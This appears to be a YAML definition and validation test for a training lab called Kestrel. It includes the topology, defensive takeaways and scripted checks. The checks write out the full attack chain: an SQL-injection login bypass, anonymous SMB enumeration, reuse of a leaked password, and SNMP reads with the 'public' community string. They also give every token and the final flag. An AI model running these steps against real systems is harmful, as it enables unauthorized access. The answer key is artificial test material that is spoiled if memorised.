topology:
  nodes:
    - id: "kestrel-portal"
      label: "Kestrel Project CMS"
      type: "server"
      ip_offset: "10"
      ports: [80]
      services: ["Flask"]
      x: 1
      y: 1
    - id: "kestrel-fs"
      label: "Kestrel File Server"
      type: "server"
      ip_offset: "11"
      ports: [139, 445, "161/udp"]
      services: ["Samba", "SNMP"]
      x: 3
      y: 1
  edges:
    - from: "attacker"
      to: "kestrel-portal"
      label: "HTTP:80"
      access: "direct"
    - from: "attacker"
      to: "kestrel-fs"
      label: "SMB:445 / SNMP:161"
      access: "direct"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "Portal homepage responds"
      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.kestrel-portal}/"
      expect: "200"
      timeout: 15

    - name: "Robots.txt discloses staff path"
      command: "curl -s http://{target.kestrel-portal}/robots.txt | grep -c '/staff/'"
      expect: "1"
      timeout: 15

    - name: "SQLi bypass on staff portal yields token 1"
      command: "curl -s -c /tmp/kestrel_jar -b /tmp/kestrel_jar -L -d \"username=admin&password=anything' OR '1'='1\" http://{target.kestrel-portal}/staff/login | grep -o 'token=dr4ft'"
      expect: "token=dr4ft"
      timeout: 20

    - name: "SMB port responds"
      command: "nmap -p 445 --open {target.kestrel-fs} 2>&1 | grep -c '445.*open'"
      expect: "1"
      timeout: 15

    - name: "Anonymous SMB lists studio-shared"
      command: "smbclient -L //{target.kestrel-fs} -N 2>&1 | grep -c 'studio-shared'"
      expect: "1"
      timeout: 15

    - name: "Inventory doc leaks studio_archivist credentials"
      command: "smbclient //{target.kestrel-fs}/studio-shared -N -c 'get IT_Inventory_2025.txt /tmp/kestrel_inv.txt' 2>&1 && grep -o 'Arch_K3str3l_2024#' /tmp/kestrel_inv.txt"
      expect: "Arch_K3str3l_2024#"
      timeout: 15

    - name: "Token 2 retrievable from project-archive with creds"
      command: "smbclient //{target.kestrel-fs}/project-archive -U studio_archivist%Arch_K3str3l_2024# -c 'get closed_projects_index.txt /tmp/kestrel_arch.txt' 2>&1 && grep -o 'token=bluepr1nt' /tmp/kestrel_arch.txt"
      expect: "token=bluepr1nt"
      timeout: 15

    - name: "Token 3 retrievable from SNMP sysContact"
      command: "snmpwalk -v2c -c public {target.kestrel-fs} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o 'token=t4lon'"
      expect: "token=t4lon"
      timeout: 20

    - name: "Verify assembled flag"
      command: "echo 'OCR{dr4ft_bluepr1nt_t4lon}'"
      expect: "OCR{dr4ft_bluepr1nt_t4lon}"
